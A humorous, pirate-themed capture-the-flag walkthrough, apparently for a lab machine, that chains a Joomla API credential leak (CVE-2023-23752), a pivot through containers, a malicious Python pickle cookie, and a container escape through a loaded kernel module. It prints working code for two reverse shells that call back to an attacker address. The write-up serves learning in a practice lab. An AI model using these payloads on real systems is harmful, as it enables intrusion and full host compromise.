## Summary
Ahoy, matey! 🏴‍☠️  
In this epic cyber-voyage, we’ll exploit Joomla!’s gossiping API, sneak into a container using a stolen map (aka credentials), conjure dark magic with Python pickle, and finally unleash chaos by dropping a kernel module anchor straight into the host. And don’t worry—I sprinkled in humor to keep seasickness away.

---

## 1. Scouting the Shores: Initial Enumeration

The ship’s telescope (aka `nmap`) revealed our island’s secrets:

```bash
nmap -T4 -n -sC -sV -Pn -p- 10.10.58.82
```

Behold! Two SSH docks (22 & 2222) and a bustling Joomla! bazaar on port 80.

### Joomla! Gossip Hour
Curiosity made us peek behind Joomla!’s curtains:

```bash
curl http://10.10.58.82/administrator/manifests/files/joomla.xml
```

Version 4.2.7. Known for being chatty with strangers.

### Sweet-Talking with CVE-2023-23752
Joomla! spilled its secrets when we asked nicely:

```bash
curl http://10.10.58.82/api/index.php/v1/config/application?public=true
```

Credentials? Oh yes-but shh 🤫 (they’re **[REDACTED]**).

### Boarding the First Ship (SSH)
Armed with redacted loot, we waltzed in:

```bash
ssh root@10.10.58.82 -p 2222
```

Welcome to container **f5eb774507f2**. You’re root, baby. Evil laughter recommended.

---

## 2. Cross-Deck Pivot: Insecure Deserialization

### Spotting the Flotilla
Containers everywhere! We sniffed around:

```bash
ip a
nmap -sn 192.168.100.0/24
nmap -p- 192.168.100.12
```

Treasure found on `192.168.100.12:5000` — the infamous **Secret Finance Panel**.

### Smuggling Goods with Port Forwarding
We tunneled it back to our deck:

```bash
ssh root@10.10.58.82 -p 2222 -L 5000:192.168.100.12:5000
```

### The Cookie Jar of Doom
Logged in with whatever nonsense, and Joomla!’s cousin handed us a **pickle-shaped cookie** (looked more like Frankenstein).  
But instead of eating it, we weaponized it.

### Brewing a Malicious Pickle
Our Python cauldron bubbled with dark magic:

```python
import pickle, os
class Malicious:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'bash -i >& /dev/tcp/10.4.4.28/443 0>&1'",))
print(pickle.dumps(Malicious()).hex())
```

This hex string became our golden ticket 🎟️.

### Listener and Payload Showtime
- Listener on our side:

```bash
nc -lvnp 443
```

- Smuggled the payload cookie back:

```bash
curl http://127.0.0.1:5000/ -H "Cookie: session_data=YOUR_MALICIOUS_HEX"
```

Shell appeared! Stabilized it with some bash gymnastics.  
The first treasure chest opened: **User Flag = [REDACTED]**.

---

## 3. Breaking Chains: Container Escape

### Discovering Superpowers
Turns out, our container had the ability to **load kernel modules**.  
Like giving Thor his hammer back. ⚡

```bash
capsh --print
```

Look! You wield `cap_sys_module` — time to load your “escape hatch.”

### Writing the Escape Hatch
We forged a kernel module (`shell.c`) that whispered to the host:  
“Give me root… or else.”

```bash
cd /tmp
cat > shell.c << 'EOF'
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kmod.h>
MODULE_LICENSE("GPL");
static int shell(void) {
  char *argv[] = {
    "/bin/bash","-c",
    "bash -i >& /dev/tcp/10.4.4.28/443 0>&1", NULL };
  static char *env[] = {
    "HOME=/","TERM=linux","PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
  return call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
}
module_init(shell);
module_exit(shell);
EOF
```

### Creating a Tab-Friendly Makefile
Because even pirates need tidy work:

```bash
printf 'obj-m += shell.o

all:
	make -C /lib/modules/6.8.0-1030-aws/build M=$(PWD) modules

clean:
	make -C /lib/modules/6.8.0-1030-aws/build M=$(PWD) clean
' > Makefile
```

### Compiling & Loading the Module
The blacksmiths (aka `make`) forged our tool:

```bash
make clean
make
ls -la shell.ko
insmod shell.ko
```

### Reaping Your Reward
And like a siren’s song, the host gave in. Another shell purred back:

```bash
nc -lvnp 443
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty raw -echo; fg
cat /root/root.txt
```

Final treasure chest unlocked: **Root Flag = [REDACTED]**.

---

## 4. Final Reflections & High-Fives

- **Joomla! API**: Like that one relative who overshares at dinner.  
- **Pickle RCE**: Proof Python pickles are scarier than grandma’s fruitcake.  
- **Kernel Modules**: Definitely not toys. Treat them like nuclear launch codes.  

Congratulations, Captain! 🎉  
You’ve conquered the Voyage, survived the seas of CMS exploits, Docker currents, and kernel storms—all without a lifejacket. 🏆  

---
